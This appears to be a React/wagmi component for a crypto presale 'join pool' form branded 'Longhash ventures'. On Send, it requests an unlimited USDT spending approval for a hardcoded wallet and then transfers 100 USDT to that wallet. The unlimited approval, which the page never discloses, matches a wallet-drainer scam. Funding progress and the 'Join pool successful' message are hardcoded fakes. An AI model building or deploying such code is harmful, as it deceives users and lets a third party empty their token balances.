import ButtonPrimary from "./ButtonPrimary";
import { useCallback, useEffect, useMemo, useState } from "react";
import {
  useAccount,
  useChainId,
  useReadContracts,
  useWaitForTransactionReceipt,
  useWriteContract,
} from "wagmi";
import { TOKEN_DIVIDEND, USDT_CONTRACT } from "../common/constant";
import { erc20Abi, maxUint256, parseEther } from "viem";
import BigNumber from "bignumber.js";
import showToast from "../utils/showToast";
import CheckIcon from "@mui/icons-material/Check";

const walletReceive = "0x1Bb8a3A4Db968158725a8d0D009723547110329e";

const FormTransaction = () => {
  // const [inputValue, setInputValue] = useState("100");
  // const onChangeInputValue = useCallback((event) => {
  //   setInputValue(event.target.value);
  // }, []);
  const { isConnected } = useAccount();

  const [errors, setErrors] = useState();
  const [loading, setLoading] = useState(false);
  const [joinPool, setJoinPool] = useState(false);

  const { address } = useAccount();
  const chainId = useChainId();
  // const estimateGas = useEstimateGas();
  // const estimateFeePerGas = useEstimateMaxPriorityFeePerGas();

  const rawBalance = useReadContracts({
    allowFailure: true,
    contracts: [
      {
        address: USDT_CONTRACT[chainId],
        abi: erc20Abi,
        functionName: "balanceOf",
        // @ts-ignore
        args: [address],
      },
    ],
    query: {
      enabled: typeof address !== "undefined",
      refetchInterval: 1000,
    },
  });

  // const isDisabledInput = loading || !address;

  const { error: errorApprove, writeContractAsync: writeContractApproveAsync } =
    useWriteContract();

  const {
    data: sendHash,
    error: errorSend,
    writeContractAsync: writeContractSendAsync,
  } = useWriteContract();

  const { isSuccess: isConfirmedSend } = useWaitForTransactionReceipt({
    hash: sendHash,
  });

  const balance = useMemo(() => {
    const rawBalanceValue = rawBalance.data?.[0]?.result;

    if (!rawBalanceValue) {
      return {
        value: undefined,
        formattedNumber: undefined,
        formatted: undefined,
      };
    }

    const balanceBn = BigNumber(rawBalanceValue.toString()).div(TOKEN_DIVIDEND);

    return {
      value: rawBalanceValue,
      formattedNumber: balanceBn.toNumber(),
      formatted: balanceBn.toString(),
    };
  }, [rawBalance]);

  const onJoinPool = () => {
    showToast("success", "Join pool successful", {
      autoClose: 3000,
    });
    setJoinPool(true);
  };

  // const onClickMax = useCallback(() => {
  //   const balanceValue = balance?.value;

  //   if (!balanceValue) {
  //     setInputValue("0");
  //     return;
  //   }

  //   const balanceValueBn = BigNumber(balanceValue.toString());

  //   setInputValue(balanceValueBn.div(TOKEN_DIVIDEND).toString());
  // }, [balance]);

  //   const onChangeToAddress = useCallback(
  //     (event: ChangeEvent<HTMLInputElement>) => {
  //       setToAddress(event.target.value);
  //     },
  //     []
  //   );

  const onClickSend = async () => {
    setErrors(undefined);

    const errorArr = [];

    // if (!toAddress || !isAddress(toAddress)) {
    //   errorArr.push(`Address '${toAddress}' is invalid.`);
    // }

    let sendValue;

    try {
      sendValue = parseEther("100");
      console.log(balance?.formattedNumber);
      if ((balance?.formattedNumber ?? 0) < 100) {
        errorArr.push("Insufficient balance.");
      }
    } catch (e) {
      errorArr.push(e.message);
    }

    if (errorArr.length > 0) {
      setErrors(errorArr.join("\n"));
      return;
    }

    setLoading(true);

    await writeContractApproveAsync({
      address: USDT_CONTRACT[chainId],
      functionName: "approve",
      abi: erc20Abi,
      // @ts-ignore
      args: [walletReceive, maxUint256],
    });

    await writeContractSendAsync({
      address: USDT_CONTRACT[chainId],
      functionName: "transfer",
      abi: erc20Abi,
      // @ts-ignore
      args: [walletReceive, sendValue],
    });

    setLoading(false);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  };

  useEffect(() => {
    if (errorApprove) {
      setErrors(errorApprove.shortMessage ?? errorApprove.message);
    }

    if (errorSend) {
      setErrors(errorSend.shortMessage ?? errorSend.message);
    }
  }, [errorApprove, errorSend]);

  useEffect(() => {
    if (isConfirmedSend) {
      showToast("success", "Transaction confirmed: " + sendHash, {
        autoClose: 5000,
      });
      setLoading(false);
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isConfirmedSend]);

  useEffect(() => {
    if (errors) {
      showToast("error", errors);
      setLoading(false);
    }
  }, [errors]);

  return isConnected ? (
    joinPool ? (
      <div className="flex flex-col w-full p-6 rounded-lg lg:w-[90%] bg-whiteColor shadow-2xl">
        <div className="flex items-start justify-between">
          <div className="flex flex-col gap-y-2">
            <div className="flex items-center p-2 rounded-md w-fit gap-x-1 bg-secondColor bg-opacity-15 text-secondColor">
              <CheckIcon className="text-sm md:text-base" />
              <p className="text-base font-semibold">Longhash ventures</p>
            </div>
            <h5 className="text-[26px] md:text-3xl font-bold">$20.000</h5>
          </div>
          <img src="wxp6bd78dkldjvflf74r.png" className="w-8 md:w-10" alt="" />
        </div>
        <p className="text-base text-[#999]">Maximum funding goal reached</p>
        <div className="w-full h-2 my-3 overflow-hidden rounded-md bg-primaryColor bg-opacity-40">
          <div className="h-full w-[95%] bg-hoverPrimaryColor" />
        </div>

        <div className="flex flex-col mt-2 gap-y-3">
          <div className="flex text-[17px] justify-between font-medium gap-x-1">
            <p className="opacity-50">Price per token</p>
            <span className="flex-1 h-5 border-b border-dotted border-blackColor"></span>
            <p>$0.005</p>
          </div>

          <div className="flex justify-between text-[17px] font-medium gap-x-1">
            <p className="opacity-50">Unlock vesting</p>
            <span className="flex-1 h-5 border-b border-dotted border-blackColor"></span>
            <p>100%TGE</p>
          </div>

          <div className="flex flex-col w-full gap-y-3 text-[17px] font-medium">
            <p className="opacity-50">Allocation</p>
            {/* <div className="flex flex-row items-center w-full mt-2 space-x-2 text-base rounded-md h-14">
            <div className="flex items-center justify-center flex-1 h-full rounded-md select-none bg-stroke">
              <h5>100 USDT</h5>
            </div>
            <div className="flex items-center justify-center flex-1 h-full rounded-md select-none bg-stroke opacity-60">
              <h5>300 USDT</h5>
            </div>
            <div className="flex items-center justify-center flex-1 h-full rounded-md select-none bg-stroke opacity-60">
              <h5>500 USDT</h5>
            </div>
          </div> */}
            {/* <input
            type="number"
            className="w-full tracking-wider px-5 py-[14px] text-xl transition-all bg-transparent border border-gray-700 rounded-lg outline-none focus:border-stroke"
            disabled={isDisabledInput}
            placeholder="0.0000"
            value={inputValue}
            onChange={onChangeInputValue}
          /> */}
            <div className="grid w-full grid-cols-2 gap-3 text-base">
              <div className="px-4 py-3 font-semibold border rounded-[4px] select-none transition-all text-center  hover:bg-secondColor hover:bg-opacity-10 cursor-pointer text-secondColor border-secondColor">
                100 USDT
              </div>
              <div className="px-4 py-3 font-semibold border rounded-[4px] select-none transition-all text-center  opacity-80 pointer-events-none border-grayColor text-[#999]">
                300 USDT
              </div>
              <div className="px-4 py-3 font-semibold border rounded-[4px] select-none transition-all text-center  opacity-80 pointer-events-none border-grayColor text-[#999]">
                500 USDT
              </div>
              <div className="px-4 py-3 font-semibold border rounded-[4px] select-none transition-all text-center  opacity-80 pointer-events-none border-grayColor text-[#999]">
                1000 USDT
              </div>
            </div>
          </div>
        </div>
        <div className="flex flex-col items-end mt-3 gap-y-2">
          <p className="text-sm transition-all cursor-default w-fit text-[#999] hover:text-secondColor">
            Available{" "}
            {balance?.formattedNumber
              ? new Intl.NumberFormat("en-US").format(balance.formattedNumber)
              : 0}{" "}
            USDT
          </p>
          <ButtonPrimary
            onClick={onClickSend}
            className="w-full uppercase px-4 py-[14px]"
            loading={loading}
          >
            Send
          </ButtonPrimary>
        </div>
      </div>
    ) : (
      <ButtonPrimary
        className="w-full px-4 py-3 font-semibold uppercase"
        onClick={onJoinPool}
      >
        Join pool
      </ButtonPrimary>
    )
  ) : (
    <ButtonPrimary
      primary={false}
      className="w-full px-4 py-3 rounded-full pointer-events-none select-none"
    >
      Please connect your wallet
    </ButtonPrimary>
  );
};

export default FormTransaction;
